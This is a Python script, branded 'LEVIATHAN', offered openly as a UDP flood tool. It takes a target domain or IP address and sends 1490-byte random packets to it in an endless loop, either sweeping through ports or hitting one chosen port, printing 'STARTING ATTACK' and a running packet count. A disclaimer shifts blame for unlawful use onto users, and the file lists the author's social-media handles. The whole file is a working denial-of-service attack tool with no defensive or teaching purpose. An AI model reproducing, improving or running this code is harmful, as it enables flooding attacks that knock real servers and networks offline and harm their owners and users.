""" Copyright (c) 2024-2025 LEVIATHAN (leviathan@support.com)
 
Distributed under the MIT License (MIT) (See accompanying file LICENSE.txt or copy at [http://opensource.org/licenses/MIT](http://opensource.org/licenses/MIT)) """

# Import necessary modules
from platform import system
from tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet

# Version
version = "1.2"

# Detect platform
uname = system()

# Clear command based on OS
if uname == "Windows":
    cmd_clear = 'cls'
else:
    cmd_clear = 'clear'

# Clear Terminal
os.system(cmd_clear)

# Print Blue Colored Border with LEVIATHAN Banner
print("\033[94m")  # Start Blue color
print(".----------------.  .----------------.  .----------------. ")
print("| \033[0m.--------------. \033[94m|| .--------------. || .--------------. |") 
print("| |  _____       | || |  ____  ____  | || |  _________   | |")
print("| | |_   _|      | || | |_  _||_  _| | || | |  _   _  |  | |")
print("| |   | |        | || |   \ \  / /   | || | |_/ | | \_|  | |")
print("| |   | |   _    | || |    \ \/ /    | || |     | |      | |")
print("| |  _| |__/ |   | || |     \  /     | || |    _| |_     | |")
print("| | |________|   | || |      \/      | || |   |_____|    | |")
print("| |              | || |              | || |              | |")
print("| '--------------' || '--------------' || '--------------' |")
print(" '----------------'  '----------------'  '----------------' ")
print("                    L E V I A T H A N")
print("\033[0m")  # End Blue color

# Create UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_data = random._urandom(1490)

# Main menu
while True:
    print("\n\033[92;1m")
    print("                        Author: LEVIATHAN")
    print('TEAM LEVIATHAN bears no responsibility for any unlawful actions performed using this tool.')
    print('Users are solely accountable for their activities.')
    print("\n1. Website Domain\n2. IP Address\n3. About\n4. Exit")
    print('\033[0m')

    # User input
    opt = input("\n> ")

    if opt == '1':
        domain = input("Domain: ")
        try:
            ip = socket.gethostbyname(domain)
            break
        except socket.gaierror:
            print("\033[91mInvalid Domain!\033[0m")
            time.sleep(2)
            os.system(cmd_clear)
    elif opt == '2':
        ip = input("IP Address: ")
        break
    elif opt == '3':
        print("\n\033[92mThis toolkit is created by LEVIATHAN.\033[0m")
        print("\033[92mYou can connect with me on my Telegram ID: \033[96mleviathan_official\033[0m")
        print("\033[92mMy Facebook ID: \033[96mLEVIATHAN Admin\033[0m")
        print("\033[92mOr join our public group: \033[96mLEVIATHAN Community\033[0m")
        input("\nPress Enter to continue...")
        os.system(cmd_clear)
    elif opt == '4':
        exit()
    else:
        print('\033[91mInvalid Choice!\033[0m')
        time.sleep(2)
        os.system(cmd_clear)

# Port selection
port_mode = False
port = 2

while True:
    port_bool = input("Certain port? [y/n]: ").lower()
    if port_bool == "y":
        port_mode = True
        try:
            port = int(input("Port: "))
            break
        except ValueError:
            print('\033[91mPlease enter a valid port number!\033[0m')
    elif port_bool == "n":
        break
    else:
        print('\033[91mInvalid Choice!\033[0m')
        time.sleep(2)

# Attack initializing
os.system(cmd_clear)
print('\033[36;2mLEVIATHAN INITIALIZING....\033[0m')
time.sleep(1)
print('STARTING ATTACK...')
time.sleep(2)

sent = 0

# Start Attack
if not port_mode:
    try:
        while True:
            if port >= 65534:
                port = 1
            elif port == 1900:
                port = 1901
            sock.sendto(bytes_data, (ip, port))
            sent += 1
            port += 1
            print("\033[32;1m[LEVIATHAN] Sent %s packets to %s through port: %s\033[0m" % (sent, ip, port))
    except KeyboardInterrupt:
        print('\n\033[31;1mAttack stopped by LEVIATHAN user\033[0m')

else:
    if port < 1 or port >= 65534:
        port = 80
    try:
        while True:
            sock.sendto(bytes_data, (ip, port))
            sent += 1
            print("\033[32;1m[LEVIATHAN] Sent %s packets to %s through port: %s\033[0m" % (sent, ip, port))
    except KeyboardInterrupt:
        print('\n\033[31;1mAttack stopped by LEVIATHAN user\033[0m')
